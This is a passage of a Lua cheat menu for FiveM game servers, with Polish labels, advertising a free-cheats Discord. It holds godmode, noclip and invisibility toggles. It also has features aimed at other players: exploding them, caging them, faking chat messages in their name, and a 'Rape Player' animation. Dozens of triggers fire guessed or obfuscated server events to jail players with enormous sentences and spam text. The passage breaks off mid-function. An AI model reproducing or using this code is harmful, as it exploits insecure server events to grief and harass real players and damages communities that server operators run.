              elseif LR.MenuButton("~p~#~s~ Menu broni", WMPS) then
              elseif LR.MenuButton("~p~#~s~ Opcje LUA ~o~xAries geng", LMX) then
              elseif LR.MenuButton("~p~#~s~ Fajne opcje ~o~xD", advm) then
              elseif LR.MenuButton("~p~# ~y~https://dc.xaries.pl", crds) then
			  elseif LR.Button("~f~#~r~ Wylacz menu ~s~[~g~PANIC BUTTON~s~]") then
			  Enabled = false
              end


              LR.Display()
			elseif LR.IsMenuOpened(sMX) then
				if LR.Button("Model Changer") then
					local model = KeyboardInput("Wpisz nazwe modelu", "", 100)
				RequestModel(GetHashKey(model))
				print(model)
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
				else 
					notify("~r~~h~Nieprawidlowy model") 
				end
			elseif LR.Button("Ubierz sie") then
				RandomSkin(PlayerId())
			elseif LR.CheckBox("Niesmiertelnosc", Godmode, function(enabled) Godmode = enabled end) then
              elseif LR.CheckBox("~g~Niewidzialnosc", invisible, function(enabled) invisible = enabled end) then
              elseif LR.Button("~r~Samobojstwo") then
                SetEntityHealth(PlayerPedId(-1), 0)
              elseif LR.Button("~g~Revive ~y~(Do zrobionia) ~s~") then
                TriggerEvent("esx_ambulancejob:revive")
              elseif LR.Button("~g~Ulecz") then
                SetEntityHealth(PlayerPedId(-1), 200)
              elseif LR.Button("~b~Daj armor") then
                SetPedArmour(PlayerPedId(-1), 200)
              elseif LR.CheckBox("Nieskonczone bieganie",InfStamina,function(enabled)InfStamina = enabled end) then
              elseif LR.CheckBox("Noktowizor", bTherm, function(bTherm) end) then
                therm = not therm
                bTherm = therm
                SetSeethrough(therm)
              elseif LR.CheckBox("Szybkie bieganie",fastrun,function(enabled)fastrun = enabled end) then
              elseif LR.CheckBox("Super skok", SuperJump, function(enabled) SuperJump = enabled end) then
              elseif LR.CheckBox("Noclip",Noclip,function(enabled)Noclip = enabled end) then
              end

              LR.Display()
            elseif LR.IsMenuOpened(OPMS) then
              if LR.MenuButton("~p~#~s~ Wszyscy gracze", GAPA) then
              else
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                  local currPlayer = playerlist[i]
                  if LR.MenuButton("ID: ~y~["..GetPlayerServerId(currPlayer).."] ~s~"..GetPlayerName(currPlayer).." "..(IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~r~Nie zyje" or "~g~Zyje"), 'PlayerOptionsMenu') then
                    SelectedPlayer = currPlayer
                  end
                end
              end


              LR.Display()
            elseif LR.IsMenuOpened(poms) then
              drawDescription("Main selected player options", 0.58, 0.58)
              LR.SetSubTitle(poms, "Opcje gracza [" .. GetPlayerName(SelectedPlayer) .. "]")
			  if LR.MenuButton("~p~#~s~ Troll Menu", Tmas) then
				
			  elseif LR.Button("Klonuj postac") then
			  ClonePedlol(SelectedPlayer)	

              elseif LR.Button("Obserwuj", (Spectating and "~g~[Obserwowanie]")) then
                SpectatePlayer(SelectedPlayer)

              elseif LR.Button("~r~XD ~s~Player") then
                local hashball = "stt_prop_stunt_soccer_ball"
                while not HasModelLoaded(GetHashKey(hashball)) do
                  Citizen.Wait(0)
                  RequestModel(GetHashKey(hashball))
                end
                local ball = CreateObject(GetHashKey(hashball), 0, 0, 0, true, true, false)
                SetEntityVisible(ball, 0, 0)
                AttachEntityToEntity(ball, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)

              elseif LR.Button("~g~Ulecz ~s~Gracza") then
                local medkitname = "PICKUP_HEALTH_STANDARD"
                local medkit = GetHashKey(medkitname)
                local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                CreateAmbientPickup(medkit, coords.x, coords.y, coords.z + 1.0, 1, 1, medkit, 1, 0)
                SetPickupRegenerationTime(pickup, 60)

              elseif LR.Button("Teleportuj") then
                  local confirm = KeyboardInput("Jestes pewny? t/n", "", 0)
                  if confirm == "y" then
                    local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
                    SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                  if confirm == "n" then
                    notify("~b~Operacja anulowana~s~.", false)
                  else
                    notify("~b~Invalid Confirmation~s~.", true)
                    notify("~b~Operacja anulowana~s~.", false)
                  end
                else
                  local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
                  SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                end

              elseif LR.MenuButton("~p~#~s~ Daj bron", GSWP) then

              elseif LR.Button("Give ~r~All Weapons") then
                for i = 1, #allWeapons do
                  GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                end

              elseif LR.Button("Give ~r~Vehicle") then
                local ped = GetPlayerPed(SelectedPlayer)
                local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                  RequestModel(ModelName)
                  while not HasModelLoaded(ModelName) do
                    Citizen.Wait(0)
                  end
                  local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped)+90, true, true)
                else
                  notify("~b~Model is not valid!", true)
                end

              elseif LR.Button("Wyslij do wiezienia") then
                TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "Jailed")
                TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
                TSE("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
                TSE("js:jailuser", GetPlayerServerId(selectedPlayer), 45 * 60, "Jailed")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
				TSE("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
				TSE("js:jailuser", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jailer:sendToJail132", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:*", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:eloelo90", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:wwiezienie", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("searp:sendToJail", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("wyspa_jail:SendMessage", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJailhype", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJailtrop", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432, 'SenseiToUjJebanyWDupeCfelPierdolony1337Kurwo')
				TSE("17A34C820A685513C5B4ADDD85968B9E905CC300A261EB55D299ABCB6C90AAA872712B3B6C13DC41913FCC2BE84A07EF9300DC4E89669A4B0E6FBB344A69D239", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJail132", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:fabianfudalijebanyprzyglup", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 5023432432434200, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", -32432432423432432)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 3000)
				TriggerEvent('esx_jailer:wysylandoo', GetPlayerServerId(selectedPlayer), 3000000000)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999999999)
				TSE("esx-jail:jailPlayer",   GetPlayerServerId(selectedPlayer), 3000)
				TSE("esx_jailer:jailhype", GetPlayerServerId(selectedPlayer), 3000)
				TSE("esx_jailer:sendToJial", GetPlayerServerId(selectedPlayer), 59999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D?", 9333397)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 59999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D?", 9333397)
				TSE("esx-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999999999)
				TSE("hazerp:wyslijdopaki", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 50000)
				TSE("8321hiue89js", GetPlayerServerId(selectedPlayer), 5007, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 323434532532, securityToken)
				TSE("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerServerId(selectedPlayer), 300000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 500324532)
				TSE("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:Wiezienie", GetPlayerServerId(selectedPlayer), 999999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("js:jailuser", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 3000)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 300)
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 50000)
				TSE("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 5000, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("js:jailuser", GetPlayerServerId(selectedPlayer), 5000, "dude weed")
				TSE('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				ESX.ShowNotification("~b~YOOMANY ~r~ " ..  GetPlayerServerId(selectedPlayer) .. "")
				TSE('esx_policejob:zakujtypeczka',  GetPlayerServerId(selectedPlayer))
				TSE('esx_ruski_areszt:startAreszt', GetPlayerServerId(selectedPlayer))
				TSE("arisonarp:wiezienie", GetPlayerServerId(selectedPlayer), 9999999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1337)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 9999999 * 60)
				TSE("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 9999999 * 60)
				TSE("js:jailuser", GetPlayerServerId(selectedPlayer), 999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("wysparp_tablet:SendMessage", GetPlayerServerId(selectedPlayer), 9999 * 60, "FAJNY TEN ANTY LYNX", 9999999999)
				TSE("wiezieniejailer:sendToJail",3, GetPlayerServerId(selectedPlayer), 9999 * 60, "TEST", 1,2137)
				TSE("esxjailer:sendToJail2", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE('esx:wiezienie', GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailers:sendToJail", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("arisonarp:wiezienie",  GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esx_jail:sendTooJail", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailer:sendTooJail", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esxjailers:sendToJail", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE("esx_jailer:sendToWiezz",  GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9995345349999999)
				TSE("esx_jaler:sendToWiezz", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9995345349999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 9937, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9995345349999999)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(selectedPlayer), 9937 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9995345349999999)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("wyspa_jail:SendMessage", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("wyspa_jail:addKartoteka", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("projektsantos:wiezienie", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx-qalle-jail:Wiezienie", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:jail", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("projektsantos:wiezienie", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("luki_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("arisonarp:wiezienie", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 99999 * 60)
				TSE("js:jailuser", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 999999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D")
				TSE("wiezieniejailer:sendToJail",3, GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1,2137)
				TSE("esxjailer:sendToJail2", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 1)
				TSE('esx:wiezienie', GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailers:sendToJail", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("arisonarp:wiezienie",  GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jail:sendTooJail", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailer:sendTooJail", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailer:sendToJailf", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esxjailers:sendToJail", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToWiezz",  GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 99999, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_jailer:sendToJailf", GetPlayerServerId(selectedPlayer), 99999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 99953)
				TSE("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(selectedPlayer), 9999 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 9999)
				TSE("esx_jailer:sendToJailhype", GetPlayerServerId(selectedPlayer), 100 * 60, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 999)
				TSE("esx-qalle-jail:wyslijwiezienie", GetPlayerServerId(selectedPlayer), 60*1, "https://dc.xaries.pl | Darmowe cheaty na Fivem'a :D", 111)
              end

              LR.Display()
            elseif LR.IsMenuOpened(Tmas) then
              drawDescription("~r~Troll ~s~features for player", 0.58, 0.58)
              if LR.MenuButton("~p~#~s~ Spawn Peds", SPD) then
              elseif LR.Button("~r~Fake ~s~Chat Message") then
                local messaggio = KeyboardInput("Enter message to send", "", 100)
                local cazzo = GetPlayerName(SelectedPlayer)
                if messaggio then
                  TSE("_chat:messageEntered", cazzo, { 0, 0x99, 255 }, messaggio)
                end
              elseif LR.Button("~r~Kick ~s~From Vehicle") then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
              elseif LR.Button("~y~Explode ~s~Vehicle") then
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                else
                  notify("~b~Player not in a vehicle~s~.", false)
                end
              elseif LR.Button("~y~Delete ~s~Vehicle") then
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false)
                  ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                  SetVehicleHasBeenOwnedByPlayer(veh,false)
                  Citizen.InvokeNative(0xAD738C3085FE7E11, veh, false, true) -- set not as mission entity
                  SetVehicleAsNoLongerNeeded(Citizen.PointerValueIntInitialized(veh))
                  Citizen.InvokeNative(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(veh))
                end
              elseif LR.Button("~p~Fuck ~s~Vehicle") then
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local playerVeh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                  ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                  doshit(playerVeh)
                end
              elseif LR.Button("~r~Banana ~p~Party ~y~v2") then
                local pisello = CreateObject(-1207431159, 0, 0, 0, true, true, true)
                local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
                local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
                AttachEntityToEntity(pisello, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                AttachEntityToEntity(pisello2, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                AttachEntityToEntity(pisello3, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
              elseif LR.Button("~r~Explode ~s~Player") then
                AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
              elseif LR.Button("~r~Rape ~s~Player") then
                RequestModelSync("a_m_o_acult_01")
                RequestAnimDict("rcmpaparazzo_2")
                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                  Citizen.Wait(0)
                end

                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                  while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                  end
                  SetEntityAsMissionEntity(veh, true, true)
                  DeleteVehicle(veh)
                  DeleteEntity(veh)
                end
                count = -0.2
                for b=1,3 do
                  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                  local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
                  SetEntityAsMissionEntity(rapist, true, true)
                  AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                  ClearPedTasks(GetPlayerPed(SelectedPlayer))
                  TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetPedKeepTask(rapist)
                  TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetEntityInvincible(rapist, true)
                  count = count - 0.4
                end
              elseif LR.Button("~r~Cage ~s~Player") then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                roundx = tonumber(string.format("%.2f", x))
                roundy = tonumber(string.format("%.2f", y))
                roundz = tonumber(string.format("%.2f", z))
                local cagemodel = "prop_fnclink_05crnr1"
                local cagehash = GetHashKey(cagemodel)
                RequestModel(cagehash)
                while not HasModelLoaded(cagehash) do
                  Citizen.Wait(0)
                end
                local cage1 = CreateObject(cagehash, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
                local cage2 = CreateObject(cagehash, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
                SetEntityHeading(cage1, -90.0)
                SetEntityHeading(cage2, 90.0)
                FreezeEntityPosition(cage1, true)
                FreezeEntityPosition(cage2, true)
              elseif LR.Button("~r~Hamburgher ~s~Player") then
                local hamburg = "xs_prop_hamburgher_wl"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
              elseif LR.Button("~r~Hamburgher ~s~Player Car") then
                local hamburg = "xs_prop_hamburgher_wl"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
              elseif LR.Button("~r~Snowball troll ~s~Player") then
                rotatier = true
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                roundx = tonumber(string.format("%.2f", x))
                roundy = tonumber(string.format("%.2f", y))
                roundz = tonumber(string.format("%.2f", z))
                local tubemodel = "sr_prop_spec_tube_xxs_01a"
                local tubehash = GetHashKey(tubemodel)
                RequestModel(tubehash)
                RequestModel(smashhash)
                while not HasModelLoaded(tubehash) do
                  Citizen.Wait(0)
                end
                local tube = CreateObject(tubehash, roundx, roundy, roundz - 5.0, true, true, false)
                SetEntityRotation(tube, 0.0, 90.0, 0.0)
                local snowhash = -356333586
                local wep = "WEAPON_SNOWBALL"
                for i = 0, 10 do
                  local coords = GetEntityCoords(tube)
                  RequestModel(snowhash)
                  Citizen.Wait(50)
                  if HasModelLoaded(snowhash) then
                    local ped = CreatePed(21, snowhash, coords.x + math.sin(i * 2.0), coords.y - math.sin(i * 2.0), coords.z - 5.0, 0, true, true) and CreatePed(21, snowhash ,coords.x - math.sin(i * 2.0), coords.y + math.sin(i * 2.0), coords.z - 5.0, 0, true, true)
                    NetworkRegisterEntityAsNetworked(ped)
                    if DoesEntityExist(ped) and
                    not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                      local netped = PedToNet(ped)
                      NetworkSetNetworkIdDynamic(netped, false)
